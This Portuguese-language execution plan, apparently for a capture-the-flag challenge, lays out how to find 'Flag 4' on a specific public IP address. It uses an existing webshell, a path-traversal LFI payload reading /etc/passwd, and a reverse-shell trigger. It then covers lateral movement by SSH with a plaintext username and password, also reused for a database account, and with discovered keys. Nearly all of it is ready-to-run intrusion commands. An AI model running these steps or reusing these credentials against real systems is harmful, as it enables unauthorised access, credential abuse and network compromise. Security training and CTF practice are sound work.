# Plano de Execução - Busca Flag 4 Parte 1

## 🎯 Objetivo
Encontrar Flag 4 no servidor 44.197.173.254 usando todas as informações já descobertas.

## 📋 Passo a Passo

### PASSO 1: Estabelecer Acesso ao Servidor

**Opção A: Via Webshell Existente**
```bash
# Se shell.php ainda existir
curl "http://44.197.173.254/shell.php?cmd=whoami"
```

**Opção B: Via LFI → RCE (se necessário)**
```bash
# Explorar LFI novamente
curl "http://44.197.173.254/noticias.php?page=../../../../etc/passwd"
```

**Opção C: Via rev.php (se ainda existir)**
```bash
# Criar shell reversa
curl "http://44.197.173.254/rev.php"
```

### PASSO 2: Executar Script de Busca

**Upload e execução do script:**
```bash
# No servidor, após estabelecer shell
bash 01_SCRIPT_BUSCA_FLAG4.sh > resultados_flag4.txt 2>&1
```

**OU executar comandos manualmente conforme checklist**

### PASSO 3: Análise dos Resultados

**Focar em:**
1. Arquivos encontrados com "flag" no nome
2. Informações de rede interna (IPs, rotas)
3. Chaves SSH encontradas
4. Conexões estabelecidas
5. Histórico de comandos suspeitos

### PASSO 4: Ações Baseadas nos Resultados

**Se encontrar arquivo flag:**
```bash
cat /caminho/para/flag.txt
```

**Se encontrar IPs internos:**
```bash
# Tentar conectar via SSH
ssh adalberto@IP_INTERNO
# Senha: WPcmqw16ZmzO!5paSC4
```

**Se encontrar chaves SSH:**
```bash
# Usar chave para conectar
ssh -i /caminho/chave id_rsa usuario@IP
```

**Se encontrar conexões estabelecidas:**
```bash
# Investigar para onde está conectado
ss -antp | grep ESTABLISHED
```

## 🔑 Credenciais Conhecidas

```
Usuário: adalberto
Senha: WPcmqw16ZmzO!5paSC4

Usuário DB: blogodb
Senha DB: WPcmqw16ZmzO!5paSC4
```

## 📊 Prioridades

1. **ALTA:** Busca completa por flags + Rede interna
2. **MÉDIA:** Chaves SSH + Histórico de comandos
3. **BAIXA:** Logs + Processos

---

**Status:** Pronto para execução quando você estabelecer acesso ao servidor
